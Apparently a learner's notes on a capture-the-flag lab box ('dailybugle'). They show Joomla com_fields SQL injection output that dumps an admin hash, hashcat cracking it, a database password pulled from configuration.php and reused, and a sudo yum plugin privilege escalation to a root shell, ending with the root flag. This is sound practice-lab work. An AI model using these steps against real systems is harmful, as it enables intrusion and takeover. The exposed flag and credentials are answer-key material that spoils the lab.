@@ -1,0 +1,100 @@
+
+http://10.10.30.93/robots.txt
+
+User-agent: *
+Disallow: /administrator/
+Disallow: /bin/
+Disallow: /cache/
+Disallow: /cli/
+Disallow: /components/
+Disallow: /includes/
+Disallow: /installation/
+Disallow: /language/
+Disallow: /layouts/
+Disallow: /libraries/
+Disallow: /logs/
+Disallow: /modules/
+Disallow: /plugins/
+Disallow: /tmp/
+
+
+Joomla! 3.7.0 - 'com_fields' SQL Injection 
+//and joomla scan find com_fields existence there
+
+[-] Fetching CSRF token
+[-] Testing SQLi
+ -  Found table: fb9j5_users
+ -  Extracting users from fb9j5_users
+[$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
+ -  Extracting sessions from fb9j5_session
+
+
+└─$ hashcat -a 0 -m 3200 hash /home/ed/tools/rockyou.txt 
+ $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:spiderman123
+                                                          
+ Session..........: hashcat
+ Status...........: Cracked
+ Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+ 
+
+ public $debug_lang = '0';
+ public $dbtype = 'mysqli';
+ public $host = 'localhost';
+ public $user = 'root';
+ public $password = 'nv5uz9r3ZEDzVjNu';
+
+ /var/www/html/configuration.php:	public $password = 'nv5uz9r3ZEDzVjNu';
+
+su jjameson with this passwd
+
+ [jjameson@dailybugle ~]$ cat >$TF/x<<EOF
+[main]
+plugins=1
+pluginpath=$TF
+pluginconfpath=$TF
+EOF
+cat >$TF/x<<EOF
+> [main]
+> plugins=1
+> pluginpath=$TF
+> pluginconfpath=$TF
+> EOF
+[jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
+[main]
+enabled=1
+EOF
+cat >$TF/y.conf<<EOF
+> [main]
+> enabled=1
+> EOF
+[jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
+import os
+import yum
+from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+requires_api_version='2.1'
+def init_hook(conduit):
+  os.execl('/bin/sh','/bin/sh')
+EOF
+cat >$TF/y.py<<EOF
+> import os
+> import yum
+> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+> requires_api_version='2.1'
+> def init_hook(conduit):
+>   os.execl('/bin/sh','/bin/sh')
+> EOF
+[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
+sudo yum -c $TF/x --enableplugin=y
+Loaded plugins: y
+No plugin match for: y
+sh-4.2# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+sh-4.2# cd /root
+cd /root
+sh-4.2# ls
+ls
+anaconda-ks.cfg  root.txt
+sh-4.2# cat root.txt
+cat root.txt
+eec3d53292b1821868266858d7fa6f79
